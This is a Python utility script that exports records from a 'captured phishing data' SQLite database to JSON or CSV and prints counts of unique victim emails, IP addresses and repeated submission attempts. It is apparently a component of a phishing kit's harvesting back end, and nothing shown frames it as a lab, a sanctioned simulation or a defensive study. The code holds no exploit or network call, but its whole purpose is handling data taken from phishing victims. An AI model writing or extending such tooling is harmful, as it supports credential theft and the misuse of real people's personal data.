#!/usr/bin/env python3
"""
Export captured phishing data to JSON/CSV
"""

import sqlite3
import json
import csv
import sys
from datetime import datetime

DB_PATH = "./data/captures.db"

def export_json():
    """Export captures to JSON"""
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT * FROM captures ORDER BY timestamp DESC")

        columns = [desc[0] for desc in c.description]
        rows = c.fetchall()
        conn.close()

        captures = [dict(zip(columns, row)) for row in rows]

        output_file = f"captures_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(output_file, 'w') as f:
            json.dump(captures, f, indent=2)

        print(f"[+] Exported {len(captures)} captures to {output_file}")
        return output_file
    except Exception as e:
        print(f"[-] Error: {e}")
        return None

def export_csv():
    """Export captures to CSV"""
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT * FROM captures ORDER BY timestamp DESC")

        columns = [desc[0] for desc in c.description]
        rows = c.fetchall()
        conn.close()

        output_file = f"captures_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
        with open(output_file, 'w', newline='') as f:
            writer = csv.DictWriter(f, fieldnames=columns)
            writer.writeheader()
            for row in rows:
                writer.writerow(dict(zip(columns, row)))

        print(f"[+] Exported {len(rows)} captures to {output_file}")
        return output_file
    except Exception as e:
        print(f"[-] Error: {e}")
        return None

def get_stats():
    """Print capture statistics"""
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()

        c.execute("SELECT COUNT(*) FROM captures")
        total = c.fetchone()[0]

        c.execute("SELECT COUNT(DISTINCT email) FROM captures")
        unique_emails = c.fetchone()[0]

        c.execute("SELECT COUNT(DISTINCT ip_address) FROM captures")
        unique_ips = c.fetchone()[0]

        c.execute("SELECT MAX(attempt_number) FROM captures WHERE email IS NOT NULL")
        max_attempts = c.fetchone()[0] or 0

        conn.close()

        print(f"\n[*] Capture Statistics:")
        print(f"    Total Captures: {total}")
        print(f"    Unique Emails: {unique_emails}")
        print(f"    Unique IPs: {unique_ips}")
        print(f"    Max Attempts (single email): {max_attempts}")
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python export_captures.py [json|csv|stats]")
        sys.exit(1)

    cmd = sys.argv[1].lower()

    if cmd == "json":
        export_json()
    elif cmd == "csv":
        export_csv()
    elif cmd == "stats":
        get_stats()
    else:
        print("Unknown command. Use: json, csv, or stats")
